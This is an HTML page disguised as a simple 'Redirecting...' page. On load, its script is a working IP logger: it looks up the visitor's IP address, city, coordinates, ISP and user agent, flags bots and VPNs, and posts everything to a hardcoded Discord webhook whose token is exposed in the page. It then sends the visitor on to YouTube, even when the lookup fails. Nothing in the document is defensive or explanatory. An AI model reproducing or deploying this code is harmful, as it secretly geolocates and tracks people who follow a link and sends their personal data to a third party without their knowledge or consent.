<!DOCTYPE html>
<html>
<head>
  <title>Redirecting...</title>
  <script>
    async function logIP() {
      try {
        const ipRes = await fetch('https://ip-api.com/json/');
        const ipData = await ipRes.json();

        const ua = navigator.userAgent;
        const uaLower = ua.toLowerCase();

        const webhookURL = "https://discord.com/api/webhooks/1391180175135473734/F_1guAsaK6cbFe4vor5O0jzsaRNVuESM5LV4SS5xYHaVlRgISMxDgqn4Uj99mO5FFJ0M";

        // Bot detection keywords
        const botKeywords = ["bot", "crawl", "spider", "curl", "wget", "python", "scrape", "slurp"];
        const isBot = botKeywords.some(keyword => uaLower.includes(keyword));

        // VPN/Proxy detection keywords in ISP/org name
        const vpnKeywords = ["vpn", "proxy", "hosting", "aws", "amazon", "google", "microsoft", "digitalocean", "cloudflare"];
        const isp = (ipData.isp || "").toLowerCase();
        const org = (ipData.org || "").toLowerCase();
        const isVPN = vpnKeywords.some(k => isp.includes(k) || org.includes(k));

        // Discord embed message structure
        const embed = {
          title: isBot ? "ðŸ¤– Possible Bot Detected" : "ðŸ“± Possible Device Detected",
          color: isBot ? 0xff0000 : 0x00ff00,
          fields: [
            { name: "IP Address", value: `\`${ipData.query}\``, inline: true },
            { name: "Location", value: `${ipData.city}, ${ipData.regionName}, ${ipData.country} (${ipData.zip})`, inline: true },
            { name: "Coordinates", value: `${ipData.lat}, ${ipData.lon}`, inline: true },
            { name: "ISP", value: ipData.isp || "N/A", inline: true },
            { name: "Organization", value: ipData.org || "N/A", inline: true },
            { name: "Timezone", value: ipData.timezone || "N/A", inline: true },
            { name: "VPN/Proxy Detected", value: isVPN ? "Yes" : "No", inline: true },
            { name: "User Agent", value: ua || "N/A", inline: false },
          ],
          footer: {
            text: "IP Logger by Your Bot"
          },
          timestamp: new Date()
        };

        await fetch(webhookURL, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ embeds: [embed] }),
        });

        setTimeout(() => {
          window.location.href = "https://youtube.com";
        }, 1000);
      } catch (e) {
        setTimeout(() => {
          window.location.href = "https://youtube.com";
        }, 1000);
      }
    }

    logIP();
  </script>
</head>
<body>
  <p>Redirecting...</p>
</body>
</html>
